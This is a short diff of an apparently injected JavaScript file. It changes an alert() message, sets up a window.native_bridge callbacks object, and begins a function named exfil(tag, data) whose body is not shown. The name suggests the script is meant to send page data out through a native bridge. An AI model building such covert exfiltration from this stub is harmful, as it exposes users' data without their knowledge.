@@ -1,4 +1,4 @@
-alert('new_script');
+alert('new_1');
 window.native_bridge = window.native_bridge || { callbacks: {} };
 
 function exfil(tag, data) {
